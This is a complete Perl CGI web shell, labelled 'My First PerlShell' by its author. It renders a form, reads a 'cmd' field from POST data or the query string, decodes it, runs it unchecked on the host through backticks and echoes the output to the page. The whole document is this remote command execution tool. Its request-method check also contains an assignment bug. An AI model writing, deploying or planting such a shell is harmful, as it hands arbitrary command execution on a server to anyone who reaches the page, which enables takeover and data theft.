#!/usr/bin/perl
print "Content-type:text/html \n\n";#At first,I missed \n\n,then 500 ERROR
print '<p><br>My First PerlShell<br>';
print '<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---by s3rching@bit.edu.cn';
print "<br><form name=\"first\" action=\"";
print $ENV{"SCRIPT_NAME"};
print "\" method=POST>";
print 'Command:<input name="cmd" type=text size=50>';
print '<input type="submit" value=exec>';
if($ENV{"REQUEST_METHOD"}="POST")
{
read(STDIN,$cmd,$ENV{"CONTENT_LENGTH"});
}
else
{
$cmd=$ENV{"QUERY_STRING"};
}
@command=split(/=/,$cmd);
$command[1]=~s/\+/ /g;
$command[1]=~s/%/0x/g;
$command[1]=~s/(0x..)/chr(hex($1))/eg;#I think it is nice.
print '<br>';
print "<font color=red>Your Command Is:</font><font color=puple>$command[1]</font></br>";
print '<font color=green>Result:</font></br>.........................<br>';
$result=`$command[1]`;
$result=~s/\n/<br>/g;
print $result;
print '<script language=javascript>first.cmd.focus();</script>';
